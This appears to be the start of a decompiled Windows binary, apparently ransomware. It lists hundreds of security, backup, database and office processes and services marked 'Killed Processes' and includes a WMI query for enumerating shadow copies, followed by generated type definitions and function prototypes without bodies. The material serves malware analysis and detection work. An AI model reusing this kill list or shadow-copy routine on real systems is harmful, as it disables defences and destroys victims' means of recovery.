//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

/* Killed Processes


calculator.exe
ccflic0.exe
ccenter.exe
ccflic4.exe
ravxp.exe
healthservice.exe
rfwproxy.exe
ilicensesvc.exe
rfwstub.exe
nimbus.exe
knownsvr.exe
prlicensemgr.exe
certificateprovider.exe
rasupd.exe
proficypublisherservice.exe
upfile.exe
proficysts.exe
rstray.exe
erlsrv.exe
ravalert.exe
vmtoolsd.exe
managementagenthost.exe
ravmond.exe
vgauthservice.exe
ravmon.exe
ravservice.exe
hasplmv.exe
ravstub.exe
spooler.exe
ravtask.exe
ravtray.exe
ntservices.exe
ravupdate.exe
rnreport.exe
monitoringhost.exe
rsnetsvr.exe
win32sysinfo.exe
scanfrm.exe
inet_gethost.exe
rfwmain.exe
taskhostw.exe
rfwsrv.exe
proficy administrator.exe
winlog.exe
ntevl.exe
omslogmanager.exe
prproficymgr.exe
snhwsrv.exe
prrds.exe
snicheckadm.exe
prrouter.exe
snichecksrv.exe
prconfigmgr.exe
snicon.exe
prgateway.exe
snsrv.exe
premailengine.exe
pralarmmgr.exe
svcharge.exe
prftpengine.exe
svdealer.exe
prcalculationmgr.exe
svframe.exe
prprintserver.exe
svtray.exe
prdatabasemgr.exe
sschk.exe
preventmgr.exe
trjscan.exe
prreader.exe
trupd.exe
prwriter.exe
ssecuritymanager.exe
prsummarymgr.exe
dltray.exe
prstubber.exe
dlservice.exe
prschedulemgr.exe
almon.exe
musnotificationux.exe
savadminservice.exe
npmdagent.exe
savservice.exe
client64.exe
sweepsrv.sys
keysvc.exe
swnetsup.exe
server_eventlog.exe
alsvc.exe
proficyserver.exe
alupdate.exe
server_runtime.exe
savmain.exe
config_api_service.exe
sav32cli.exe
fnplicensingservice.exe
certificationmanagerservicent.exe
workflowresttest.exe
emlibupdateagentnt.exe
proficyclient.exe
managementagentnt.exe
vmacthlp.exe
mgntsvc.exe
msdtssrvr.exe
routernt.exe
sqlservr.exe
schdsrvc.exe
msmdsrv.exe
scfmanager.exe
reportingservicesservice.exe
scfservice.exe
dsmcsvc.exe
scftray.exe
winvnc4.exe
op_viewer.exe
client.exe
sgbhp.exe
collwrap.exe
pctsauxs.exe
bluestripecollector.exe
pctsgui.exe
sqlbrowser.exe
pctssvc.exe
dsmcad.exe
pctstray.exe
nimcluster.exe
regmech.exe
googleupdate.exe
sdtrayapp.exe
svcntaux.exe
bcrservice.exe
swdsvc.exe
dbsrv9.exe
swnxt.exe
rtvscan.exe
execstat.exe
bcreporter.exe
seestat.exe
csadmin.exe
swserver.exe
csdbsync.exe
slee81.exe
csmon.exe
kpf4gui.exe
csauth.exe
kpf4ss.exe
cslog.exe
wrspysetup.exe
csradius.exe
acctmgr.exe
cstacacs.exe
alertsvc.exe
url_response.exe
alunotify.exe
vmware-converter-a.exe
aluschedulersvc.exe
vmware-converter.exe
appsvc32.exe
avagent.exe
paxton.net2.clientservice.exe
ccapp.exe
paxton.net2.commsserverservice.exe
ccevtmgr.exe
avscc.exe
ccproxy.exe
prunsrv.exe
ccpxysvc.exe
googlecrashhandler.exe
ccsetmgr.exe
googlecrashhandler64.exe
checkup.exe
vmwaretray.exe
nd2svc.exe
comhost.exe
tnslsnr.exe
cpdclnt.exe
omtsreco.exe
csinject.exe
oracle.exe
csinsm32.exe
patrolagent.exe
csinsmnt.exe
scfagent_64.exe
dbserv.exe
patrolperf.exe
defwatch.exe
rscdsvc.exe
diskmon.exe
pmgreader.exe
djsnetcn.exe
firefox.exe
doscan.exe
chrome.exe
dwhwizrd.exe
netsession_win.exe
fwcfg.exe
pcsws.exe
ghost_2.exe
pcscm.exe
ghosttray.exe
cwbunnav.exe
icepack.exe
rdrcef.exe
idsinst.exe
ndrvx.exe
ispwdsvc.exe
ndrvs.exe
issvc.exe
dr_serviceengine.exe
isuac.exe
teamviewer_service.exe
luall.exe
sqlagent.exe
lucallbackproxy.exe
dwrcst.exe
lucoms~1.exe
ccm messaging.exe
lucoms.exe
zoolz.exe
mcui32.exe
agntsvc.exe
navapsvc.exe
dbeng50.exe
navapw32.exe
dbsnmp.exe
navectrl.exe
encsvc.exe
navelog.exe
excel.exe
navesp.exe
firefoxconfig.exe
navshcom.exe
infopath.exe
navw32.exe
isqlplussvc.exe
navwnt.exe
msaccess.exe
ndetect.exe
msftesql.exe
ngctw32.exe
mspub.exe
ngserver.exe
mydesktopqos.exe
nisoptui.exe
mydesktopservice.exe
nisserv.exe
mysqld.exe
nisum.exe
mysqld-nt.exe
nmain.exe
mysqld-opt.exe
npfmntor.exe
ocautoupds.exe
nprotect.exe
ocomm.exe
npscheck.exe
ocssd.exe
npssvc.exe
onenote.exe
nscsrvce.exe
outlook.exe
nsctop.exe
powerpnt.exe
nsmdtr.exe
sqbcoreservice.exe
olfsnt40.exe
sqlwriter.exe
opscan.exe
steam.exe
poproxy.exe
synctime.exe
pqibrowser.exe
tbirdconfig.exe
pqv2isvc.exe
thebat.exe
pxeservice.exe
thebat64.exe
qdcsfs.exe
thunderbird.exe
qserver.exe
visio.exe
reportersvc.exe
winword.exe
wordpad.exe
savfmsesp.exe
xfssvccon.exe
savroam.exe
tmlisten.exe
savscan.exe
pccntmon.exe
savui.exe
cntaosmgr.exe
sbserv.exe
ntrtscan.exe
scanexplicit.exe
mbamtray.exe
semsvc.exe
qhactivedefense.exe
sesclu.exe
qhwatchdog.exe
sevinst.exe
qhsafetray.exe
smsectrl.exe
avgsvc.exe
smselog.exe
avgui.exe
smsesjm.exe
v3lite.exe
smsesp.exe
v3main.exe
smsesrv.exe
smsetask.exe
avastui.exe
smseui.exe
avastsvc.exe
avguard.exe
sndmon.exe
avshadow.exe
sndsrvc.exe
avgnt.exe
spbbcsvc.exe
avira.servicehost.exe
symlcsvc.exe
avira.systray.exe
symproxysvc.exe
bdagent.exe
symsport.exe
bdredline.exe
symtray.exe
symwsc.exe
bullguardbhvscanner.exe
sysdoc32.exe
bullguardscanner.exe
ucservice.exe
bullguardtray.exe
updtnv28.exe
bullguardupdate.exe
urllstck.exe
bullguard.exe
usrprmpt.exe
cmdagent.exe
v2iconsole.exe
cistray.exe
vpc32.exe
vpdn_lu.exe
spideragent.exe
vprosvc.exe
dwengine.exe
wfxctl32.exe
dwarkdaemon.exe
wfxmod32.exe
dwnetfilter.exe
wfxsnt40.exe
a2service.exe
lucomserver.exe
a2guard.exe.a2start.exe
savfmselog.exe
savfmsesjm.exe
savfmsectrl.exe
fshoster32.exe
savfmsespamstatsmanager.exe
fshoster64.exe
savfmsesrv.exe
fortisslvpndaemon.exe
savfmsetask.exe
fortiesnac.exe
savfmseui.exe
fortiwf.exe
fortitray.exe
fchelper64.exe
reportsvc.exe
fortiproxy.exe
vptray.exe
fcappdb.exe
procexp.exe
fcdblog.exe
tdimon.exe
avpui.exe
tfgui.exe
mbamservice.exe
tfservice.exe
mcsacore.exe
tftray.exe
mcapexe.exe
tiaspn~1.exe
mcshield.exe
traflnsp.exe
mcsvhost.exe
asupport.exe
nortonsecurity.exe
isntsmtp.exe
psuaservice.exe
nsmdemf.exe
psuamain.exe
nsmdmon.exe
psanhost.exe
nsmdreal.exe
sdrservice.exe
nsmdsch.exe
swc_service.exe
ofcdog.exe
swi_service.exe
pccnt.exe
pccntupd.exe
ccsvchst.exe
pcctlcom.exe
smcgui.exe
pcscnsrv.exe
coreserviceshell.exe
schupd.exe
coreframeworkhost.exe
tmntsrv.exe
uiwatchdog.exe
tmpfw.exe
uiseagnt.exe
tmproxy.exe
paamsrv.exe
psh_svc.exe
entitymain.exe
aupdrun.exe
aphost.exe
acaas.exe
lwdmserver.exe
acaegmgr.exe
acaif.exe
isntsysmonitor
acais.exe
ofcpfwsvc.exe
ahnsd.exe
dwwin.exe
ahnsdsv.exe
patch.exe
autoup.exe
pccclient.exe
v3clnsrv.exe
pccguide.exe
v3medic.exe
pcclient.exe
v3svc.exe
pccpfw.exe
aflogvw.exe
pcscan.exe
ahnrpt.exe
pntiomon.exe
atwsctsk.exe
pop3pack.exe
v3exec.exe
pop3trap.exe
v3imscn.exe
scanmailoutlook.exe
monsvcnt.exe
smoutlookpack.exe
monsysnt.exe
webtrapnt.exe
aexnsrcvsvc.exe
euqmonitor.exe
aexsvc.exe
smex_activeupda
atrshost.exe
smex_master.exe
ctdataload.exe
smex_remoteconf
aexagentuihost.exe
smex_systemwatc
aexnsagent.exe
svcgenerichost
aclntusr.exe
spntsvc.exe
aexswdusr.exe
stopp.exe
pxemtftp.exe
stwatchdog.exe
aclient.exe
usbguard.exe
securitycenter.exe
uploadrecord.exe
starta.exe
sbamsvc.exe
stopa.exe
vrvmail.exe
anvir.exe
vrvmon.exe
csrss_tc.exe
vrvnet.exe
ashavast.exe
ashbug.exe
ashchest.exe
networkagent.exe
ashcmd.exe
websensecontrolservice.exe
ashdisp.exe
mpcmdrun.exe
ashenhcd.exe
msascui.exe
ashlogv.exe
msmpeng.exe
ashmaisv.exe
mspmspsv.exe
ashpopwz.exe
kb891711.exe
ashquick.exe
zavaux.exe
ashserv.exe
zavcore.exe
ashsimp2.exe
zillya.exe
ashsimpl.exe
zlclient.exe
ashskpcc.exe
vsmon.exe
ashskpck.exe
forcefield.exe
ashupd.exe
iswmgr.exe
ashwebsv.exe
zapro.exe
aswdisp.exe
zonealarm.exe
aswregsvr.exe
mantispm.exe
aswserv.exe
Acronis VSS Provider
aswupdsv.exe
Enterprise Client Service
aswwebsv.exe
Sophos Agent
avengine.exe
Sophos AutoUpdate Service
afwserv.exe
Sophos Clean Service
avastemupdate.exe
Sophos Device Control Service
unsecapp.exe
Sophos File Scanner Service
avgamsvr.exe
Sophos Health Service
avgas.exe
Sophos MCS Agent
avgcc32.exe
Sophos MCS Client
avgcc.exe
Sophos Message Router
avgctrl.exe
Sophos Safestore Service
avgdiag.exe
Sophos System Protection Service
avgemc.exe
Sophos Web Control Service
avgfws8.exe
SQLsafe Backup Service
avgfwsrv.exe
SQLsafe Filter Service
avginet.exe
Symantec System Recovery
avgmsvr.exe
Veeam Backup Catalog Data Service
avgrssvc.exe
AcronisAgent
avgscanx.exe
AcrSch2Svc
avgserv9.exe
Antivirus
avgserv.exe
avgupd.exe
BackupExecAgentAccelerator
avgupdln.exe
BackupExecAgentBrowser
avgupsvc.exe
BackupExecDeviceMediaService
avgvv.exe
BackupExecJobEngine
avgwb.dat
BackupExecManagementService
BackupExecRPCService
avgwizfw.exe
BackupExecVSSProvider
guard.exe
avgcsrvx.exe
avgidsagent.exe
EPSecurityService
avgidsmonitor.exe
EPUpdateService
avgidsui.exe
EraserSvc11710
avgidswatcher.exe
EsgShKernel
avgam.exe
FA_Scheduler
avgnsx.exe
avgfws9.exe
avgrsx.exe
avgtray.exe
avgwdsvc.exe
MBAMService
sidebar.exe
MBEndpointAgent
avgchsvx.exe
McAfeeEngineService
avgcmgr.exe
McAfeeFramework
avgemcx.exe
McAfeeFrameworkMcAfeeFramework
avgfws.exe
avgmfapx.exe
McTaskManager
avgcefrend.exe
avgcsrva.exe
avgemca.exe
avgnsa.exe
mozyprobackup
avgrsa.exe
MsDtsServer
loggingserver.exe
MsDtsServer100
toolbarupdater.exe
MsDtsServer110
wtusystemsuport.exe
MSExchangeES
avgregcl.exe
MSExchangeIS
avgsystx.exe
MSExchangeMGMT
vprot.exe
MSExchangeMTA
avcenter.exe
MSExchangeSA
avconfig.exe
MSExchangeSRS
avesvc.exe
MSOLAP$SQL_2008
avmailc.exe
MSOLAP$SYSTEM_BGC
avmcdlg.exe
MSOLAP$TPS
avnotify.exe
MSOLAP$TPSAMA
avscan.exe
MSSQL$BKUPEXEC
guardgui.exe
MSSQL$ECWDB2
avadmin.exe
MSSQL$PRACTICEMGT
avfwsvc.exe
MSSQL$PRACTTICEBGC
avwebgrd.exe
MSSQL$PROFXENGAGEMENT
fwinst.exe
MSSQL$SBSMONITORING
sysoptenginesvc.exe
MSSQL$SHAREPOINT
bavtray.exe
MSSQL$SQL_2008
bhipssvc.exe
MSSQL$SYSTEM_BGC
MSSQL$TPS
seccenter.exe
MSSQL$TPSAMA
gziface.exe
MSSQL$VEEAMSQL2008R2
gzserv.exe
MSSQL$VEEAMSQL2012
MSSQLFDLauncher
bdlite.exe
MSSQLFDLauncher$PROFXENGAGEMENT
bdmcon.exe
MSSQLFDLauncher$SBSMONITORING
bdsubmit.exe
MSSQLFDLauncher$SHAREPOINT
deloeminfs.exe
MSSQLFDLauncher$SQL_2008
livesrv.exe
MSSQLFDLauncher$SYSTEM_BGC
setloadorder.exe
MSSQLFDLauncher$TPS
vsserv.exe
MSSQLFDLauncher$TPSAMA
xcommsvr.exe
MSSQLSERVER
MSSQLServerADHelper100
bkavsystemserver.exe
MSSQLServerOLAPService
blupro.exe
blackd.exe
blackice.exe
OracleClientCache80
proutil.exe
PDVFSService
rapapp.exe
basfipm.exe
ReportServer
isafe.exe
ReportServer$SQL_2008
cavrid.exe
ReportServer$SYSTEM_BGC
vetmsg.exe
ReportServer$TPS
ReportServer$TPSAMA
capmuamagt.exe
ccnfagent.exe
ccsmagtd.exe
SAVAdminService
cfftplugin.exe
SAVService
cfnotsrvd.exe
cfsmsmd.exe
SepMasterService
alert.exe
ShMonitor
igateway.exe
inotask.exe
SmcService
caantispyware.exe
caavcmdscan.exe
SntpService
caavguiscan.exe
sophossps
SQLAgent$BKUPEXEC
calogdump.exe
SQLAgent$ECWDB2
capfaem.exe
SQLAgent$PRACTTICEBGC
capfsem.exe
SQLAgent$PRACTTICEMGT
cappactiveprotection.exe
SQLAgent$PROFXENGAGEMENT
casecuritycenter.exe
SQLAgent$SBSMONITORING
caunst.exe
SQLAgent$SHAREPOINT
cavrep.exe
SQLAgent$SQL_2008
cctray.exe
SQLAgent$SYSTEM_BGC
ccupdate.exe
SQLAgent$TPS
isafinst.exe
SQLAgent$TPSAMA
itmrt_supportdiagnostics.exe
SQLAgent$VEEAMSQL2008R2
itmrtsvc.exe
SQLAgent$VEEAMSQL2012
itmrt_trace.exe
SQLBrowser
ppclean.exe
SQLSafeOLRService
umxagent.exe
SQLSERVERAGENT
umxcfg.exe
SQLTELEMETRY
umxfwhlp.exe
SQLTELEMETRY$ECWDB2
umxpol.exe
SQLWriter
unvet32.exe
capfasem.exe
svcGenericHost
ccprovsp.exe
swi_filter
ppctlpriv.exe
swi_service
swi_update_64
ccschedulersvc.exe
ccsystemreport.exe
inonmsrv.exe
inoweb.exe
TrueKeyScheduler
auth8021x.exe
TrueKeyServiceHelper
krbcc32s.exe
UI0Detect
VeeamBackupSvc
realmon.exe
VeeamBrokerSvc
repmgr64.exe
VeeamCatalogSvc
csacontrol.exe
VeeamCloudSvc
leventmgr.exe
VeeamDeploymentService
okclient.exe
VeeamDeploySvc
clamscan.exe
VeeamEnterpriseManagerSvc
clamtray.exe
VeeamMountSvc
clamwin.exe
VeeamNFSSvc
ccemflsv.exe
VeeamRESTSvc
cssauth.exe
VeeamTransportSvc
cavscan.exe
clpsla.exe
clpsls.exe
VeeamHvIntegrationSvc
cmdinstall.exe
swi_update
cfpconfig.exe
SQLAgent$CXDB
SQLAgent$CITRIX_METAFRAME
cfplogvw.exe
SQL Backups
cfpsbmit.exe
MSSQL$PROD
cfpupdat.exe
Zoolz 2 Service
crashrep.exe
MSSQLServerADHelper
SQLAgent$PROD
cfpconfg.exe
msftesql$PROD
csfalconservice.exe
NetMsmqActivator
cylanceui.exe
cylancesvc.exe
cramtray.exe
crssvc.exe
MSSQL$SOPHOS
amsvc.exe
SQLAgent$SOPHOS
frzstate2k.exe
drwagnui.exe
drweb32.exe
MSSQL$SQLEXPRESS
drweb32w.exe
SQLAgent$SQLEXPRESS
drweb386.exe
drwebcgp.exe
drwebdc.exe
drweb.exe
drwebmng.exe
avast! Antivirus
drwebscd.exe
drwebupw.exe
Avast Business Console Client Antivirus Service
drwebwcl.exe
drwebwin.exe
Telemetryserver
drwinst.exe
spiderml.exe
WinDefend
spidernt.exe
MCAFEETOMCATSRV530
spiderui.exe
MCAFEEEVENTPARSERSRV
drwagntd.exe
MSSQLFDLauncher$ITRIS
drwupgrade.exe
MSSQL$EPOSERVER
drwebcom.exe
MSSQL$ITRIS
eeyeevnt.exe
SQLAgent$EPOSERVER
retinaengine.exe
SQLAgent$ITRIS
a2guard.exe
SQLTELEMETRY$ITRIS
a2start.exe
MsDtsServer130
administrator.exe
SSISTELEMETRY130
control_panel.exe
MSSQLLaunchpad$ITRIS
usergate.exe
esmagent.exe
BrokerInfrastructure
ppmcativedetection.exe
EPIntegrationService
vettray.exe
EPProtectedService
cavtray.exe
epredline
inorpc.exe
inort.exe
SentinelAgent
SentinelHelperService
caissdt.exe
LogProcessorService
etagent.exe
SentinelStaticEngine
etloganalyzer.exe
etrssfeeds.exe
DB2GOVERNOR_DB2COPY1
evtarmgr.exe
DB2LICD_DB2COPY1
evtmgr.exe
DB2MGMTSVC_DB2COPY1
etreporter.exe
DB2REMOTECMD_DB2COPY1
etconsole3.exe
etwcontrolpanel.exe
useranalysis.exe
etcorrel.exe
IBMDataServerMgr
evtprocessecfile.exe
IBMDSServer41
etscheduler.exe
MSSQL$CITRIX_METAFRAME
useractivity.exe
RumorServer
traptrackermgr.exe
ewidoctrl.exe
ewidoguard.exe
nslocollectorservice.exe
fortifw.exe
update_task.exe
fpavserver.exe
fprottray.exe
fameh32.exe
fspex.exe
fch32.exe
fih32.exe
fsaua.exe
fsav32.exe
fscuif.exe
fsdfwd.exe
fsgk32.exe
fsgk32st.exe
fsguidll.exe
fsguiexe.exe
fshdll32.exe
fsm32.exe
fsma32.exe
fsmb32.exe
fsorsp.exe
fssm32.exe
setupguimngr.exe
tnbutil.exe
fsavgui.exe
gdscan.exe
avkproxy.exe
avkservice.exe
avktray.exe
avkwctl.exe
gdfirewalltray.exe
gdfwsvc.exe
endpointsecurity.exe
esecservice.exe
gfireporterservice.exe
esecagntservice.exe
rcsvcmon.exe
dolphincharge.e
dolphincharge.exe
loggetor.exe
netalertclient.exe
printdevice.exe
pwdfilthelp.exe
pthosttr.exe
hpqwmiex.exe
ntcaagent.exe
ntcadaemon.exe
ntcaservice.exe
privacyiconclient.exe
rapuisvc.exe
vpatch.exe
tclproc.exe
isscsf.exe
issdaemon.exe
kvdetech.exe
kvmonxp_2.kxp
kvmonxp.kxp
kvolself.exe
kvsrvxp_1.exe
kvsrvxp.exe
ppppwallrun.exe
avpcc.exe
avpexec.exe
avpncc.exe
avpupd.exe
kavisarv.exe
kavmm.exe
kavss.exe
kavsvc.exe
klnagent.exe
klswd.exe
klwtblfs.exe
kwsprod.exe
up2date.exe
klserver.exe
oespamtest.exe
kavadapterexe.exe
kavlotsingleton.exe
kavfsgt.exe
kavfsrcn.exe
kavfs.exe
kavfswp.exe
kavshell.exe
klnacserver.exe
avpdtagt.exe
netcfg.exe
kavfsscs.exe
kavtray.exe
persfw.exe
avserver.exe
winroute.exe
wrctrl.exe
kabackreport.exe
kaccore.exe
kanmcmain.exe
kastray.exe
kislive.exe
kmailmon.exe
knupdatemain.exe
kswebshield.exe
kxeserv.exe
uplive.exe
kansgui.exe
kansvr.exe
kavstart.exe
kpfwsvc.exe
kwatch.exe
kav32.exe
kissvc.exe
kpfw32.exe
system.exe
wssfcmai.exe
aawservice.exe
ad-aware2007.exe
nlsvc.exe
engineserver.exe
eventparser.exe
log_qtine.exe
mfeann.exe
nailgpip.exe
rpcserv.exe
srvmon.exe
mcagent.exe
mfemactl.exe
macmnsvc.exe
masvc.exe
masalert.exe
msssrv.exe
massrv.exe
msscli.exe
mcshld9x.exe
mgavrtcl.exe
mcappins.exe
mfecanary.exe
macompatsvc.exe
mcvsrte.exe
mfefire.exe
dao_log.exe
firesvc.exe
firetray.exe
mfeesp.exe
naprdmgr.exe
mfefw.exe
frameworkservic
cmgrdian.exe
mcshell.exe
mfehcs.exe
mcinfo.exe
hwapi.exe
mcafeedatabackup.exe
mcmscsvc.exe
mcnasvc.exe
mcods.exe
mcpromgr.exe
mcproxy.exe
mcuimgr.exe
mpfsrv.exe
mpsevh.exe
msksrver.exe
redirsvc.exe
saservice.exe
siteadv.exe
mfemms.exe
neotrace.exe
vshwin32.exe
mpfagent.exe
mpfconsole.exe
mpfservice.exe
mpftray.exe
mscifapp.exe
mfevtps.exe
qclean.exe
mcregwiz.exe
rssensor.exe
safeservice.exe
ncdaemon.exe
mcdash.exe
mcdetect.exe
ssscheduler.exe
sahookmain.exe
mskdetct.exe
msksrvr.exe
mskagent.exe
stinger.exe
mcsysmon.exe
mctskshd.exe
mfetp.exe
myagttry.exe
mcupdmgr.exe
rulaunch.exe
mcvsshld.exe
tbmon.exe
alogserv.exe
mcmnhdlr.exe
mghtml.exe
edisk.exe
scan32.exe
frameworkservice.exe
McAfee SiteAdvisor Enterprise Service
mcconsol.exe
mcscript_inuse.exe
mctray.exe
mcupdate.exe
shstat.exe
udaterui.exe
updaterui.exe
mcepoc.exe
mcepocfg.exe
mcpalmcfg.exe
mcwcecfg.exe
mcwce.exe
frameworkservic.exe
vsmain.exe
oasclnt.exe
ImapiService
vsstat.exe
mcvsftsn.exe
avconsol.exe
avsynmgr.exe
vstskmgr.exe
webscanx.exe
SnowInventoryClient
mfewc.exe
mfewch.exe
giantantispywaremain.exe
giantantispywareupdater.exe
gcasservalert.exe
WebClient
gcascleaner.exe
gcasinstallhelper.exe
BlueStripeCollector
gcasnotice.exe
gcasdtserv.exe
gcasserv.exe
gcasswupdater.exe
fcsms.exe
HealthService
fcssas.exe
NimbusWatcherService
nissrv.exe
ProLiantMonitor
dpmra.exe
SDD_Service
msseces.exe
wscntfy.exe
securitymanager.exe
GoogleChromeElevationService
aesecurityservice.exe
bcrservice
deteqt.agent.exe
omniagent.exe
nerosvc.exe
seanalyzertool.exe
spyemergency.exe
spyemergencysrv.exe
nlclient.exe
nmagent.exe
ehttpsrv.exe
nod32.exe
VGAuthService
nod32krn.exe
SepMasterServiceMig
nod32kui.exe
vmware-converter-agent
nod32view.exe
vmware-converter-server
cclaw.exe
vmware-converter-worker
elogsvc.exe
MSSQL$NET2
nipsvc.exe
Net2ClientSvc
njeeves.exe
npfmsg2.exe
SQLAgent$NET2
npfmsg.exe
tpautoconnsvc
npfsvice.exe
TPVCGateway
nrmenctb.exe
VMwareCAFCommAmqpListener
nvcoas.exe
VMwareCAFManagementAgentHost
nvcsched.exe
TPAutoConnSvc
nymse.exe
AdobeARMservice
zanda.exe
ixaptsvc.exe
msvsmon90
ixavsvc.exe
ixfwsvc.exe
emlproui.exe
emlproxy.exe
mpsvc.exe
onlinent.exe
onlnsvc.exe
scanmsg.exe
scanwscs.exe
tsansrf.exe
tsatisy.exe
tscutynt.exe
tsmpnt.exe
upschd.exe
xfilter.exe
outpost.exe
adminserver.exe
avtask.exe
clshield.exe
console.exe
cpntsrv.exe
padfsvr.exe
pasystemtray.exe
pavfnsvr.exe
pavkre.exe
pavprot.exe
pavreport.exe
pnmsrv.exe
psimsvc.exe
pavupg.exe
remupd.exe
iface.exe
pavfires.exe
pavmail.exe
pavprsrv.exe
pavsched.exe
pavsrv50.exe
pavsrv51.exe
pavsrv52.exe
prevsrv.exe
tpsrv.exe
pagent.exe
pagentwd.exe
psctris.exe
apvxdwin.exe
inicio.exe
pavbckpt.exe
pavjobs.exe
psctrls.exe
pshost.exe
psimreal.exe
pskmssvc.exe
srvload.exe
webproxy.exe
avltmain.exe
firewallgui.exe
pviewer.exe
pview.exe
qoeloader.exe
IsWow64Process
kernel32.dll
__ProviderArchitecture
ROOT\cimv2
select * from Win32_ShadowCopy
Win32_ShadowCopy.ID='%s'
Ntrtscan*
ds_monitor*
Notifier*
TmListen*
iVPAgent*
CNTAoSMgr*
store.exe
MSSQL$ISARS
MSSQL$MSFW
SQLAgent$ISARS
SQLAgent$MSFW
ReportServer$ISARS
MSExchangeADTopology
MSExchangeFBA
ShadowProtectSvc
SPAdminV4
SPTimerV4
SPTraceV4
SPUserCodeV4
SPWriterV4
SPSearch4
firebirdguardiandefaultinstance
QBCFMonitorService
QBPOSDBServiceV12
"IBM Domino Server(CProgramFilesIBMDominodata)"
"IBM Domino Diagnostics(CProgramFilesIBMDomino)"
"Simply Accounting Database Connection Manager"
QuickBooksDB1
QuickBooksDB2
QuickBooksDB3
QuickBooksDB4
QuickBooksDB5
QuickBooksDB6
QuickBooksDB7
QuickBooksDB8
QuickBooksDB9
QuickBooksDB10
QuickBooksDB11
QuickBooksDB12
QuickBooksDB13
QuickBooksDB14
QuickBooksDB15
QuickBooksDB16
QuickBooksDB17
QuickBooksDB18
QuickBooksDB19
QuickBooksDB20
QuickBooksDB21
QuickBooksDB22
QuickBooksDB23
QuickBooksDB24
QuickBooksDB25

*/

#include <math.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int80_t;
typedef int64_t int128_t;
typedef int64_t int864_t;

// ----------------- Float Types Definitions ------------------

typedef float float16_t;
typedef float float32_t;
typedef double float64_t;
typedef long double float80_t;

// ------------------------ Structures ------------------------

struct struct1 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct struct2 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct struct3 {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
};

struct _EXCEPTION_POINTERS {
    struct _EXCEPTION_RECORD * e0;
    struct _CONTEXT * e1;
};

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _LARGE_INTEGER {
    int64_t e0;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _NETRESOURCEW {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int16_t * e4;
    int16_t * e5;
    int16_t * e6;
    int16_t * e7;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOW {
    int32_t e0;
    int16_t * e1;
    int16_t * e2;
    int16_t * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _SYSTEMTIME {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    int16_t e4;
    int16_t e5;
    int16_t e6;
    int16_t e7;
};

struct _WIN32_FIND_DATAA {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    char e8[1];
    char e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct _cpinfo {
    int32_t e0;
    char e1[1];
    char e2[1];
};

struct tagPROCESSENTRY32W {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int16_t e9[1];
};

// ------------------- Function Prototypes --------------------

int32_t entry_point(void);
int32_t function_401000(void);
int32_t function_401010(void);
int32_t function_4011c0(void);
int32_t function_401410(void);
int32_t function_4015c0(void);
int32_t function_4017b0(int32_t a1, int32_t a2);
int32_t function_401d00(void);
int32_t function_401d30(int32_t a1);
int32_t function_401d50(int32_t a1, int32_t a2);
int32_t function_401d70(int32_t a1);
int32_t function_401d90(uint32_t a1, int32_t a2, uint32_t a3);
int32_t function_401e30(int32_t a1, uint32_t a2, int32_t a3, int32_t a4, int32_t a5);
